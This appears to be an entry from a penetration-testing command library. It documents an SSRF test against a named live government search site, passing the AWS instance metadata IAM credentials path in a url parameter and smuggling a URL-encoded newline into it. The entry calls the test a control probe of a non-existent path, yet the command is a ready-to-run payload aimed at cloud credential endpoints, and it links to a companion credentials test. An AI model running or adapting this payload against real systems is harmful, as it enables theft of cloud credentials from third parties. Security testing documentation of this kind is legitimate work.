---
id: cmd-ssrf-aws-credentialx
data: >-
  curl -X GET
  "https://search.usa.gov/help_docs?url=http://169.254.169.254/latest/meta-data/iam/security-credentialx/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html"
  -H "Host: search.usa.gov" -H "Cookie: [session_cookies]"
tags:
  - ssrf
  - aws
  - metadata
type: command
output: >-
  HTTP/1.1 200 OK with error 'Unable to retrieve
  http://169.254.169.254/latest/meta-data/iam/security-credentialx/?\nhttps://search.gov/manual/account.html'
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:53:38.651Z'
verified: false
validated: true
submitted: true
---
# ssrf-aws-iam-credentialx-test

## Command

```bash
curl -X GET "https://search.usa.gov/help_docs?url=http://169.254.169.254/latest/meta-data/iam/security-credentialx/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html" -H "Host: search.usa.gov" -H "Cookie: [session_cookies]"
```

## Description

Tests non-existent AWS metadata path to confirm distinction.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url=...` | Invalid AWS path payload | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://search.usa.gov/help_docs?url=http://169.254.169.254/latest/meta-data/iam/security-credentialx/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html" [headers]
```

## Expected Output

200 OK with retrieval error.

## Related

- [[commands/ssrf-aws-iam-credentials-test]]
- [[procedures/Test-AWS-Metadata-Non-Existent-Endpoint-via-SSRF]]
